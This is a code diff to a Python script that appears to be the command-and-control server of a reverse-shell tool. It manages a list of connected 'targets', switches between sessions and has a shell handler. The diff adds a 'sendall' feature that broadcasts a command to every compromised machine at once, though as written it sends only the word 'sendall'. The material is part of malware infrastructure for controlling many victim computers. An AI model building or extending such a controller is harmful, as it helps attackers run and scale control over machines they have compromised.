@@ -6,7 +6,9 @@ import os
 import base64
 import threading
 
-
+def sentoAll(target,data):
+    json_data = json.dumps(data)
+    target.send(bytes(json_data, 'utf-8'))
 
 def shell(target, ip):
     def relibale_send(data):
@@ -111,6 +113,17 @@ while True:
         stop_threads = True
         t1.join()
         break
+    elif command == "sendall":
+        length_of_target = len(targets)
+        i = 0
+        try:
+            while i<length_of_target:
+                tarNumber =  targets[i]
+                print(tarNumber)
+                sentoAll(tarNumber,command)
+                i += 1
+        except:
+            print("[!!] failed to send command to all targets")
     elif command[:7] == "session":
         try:
             num = int(command[8:])
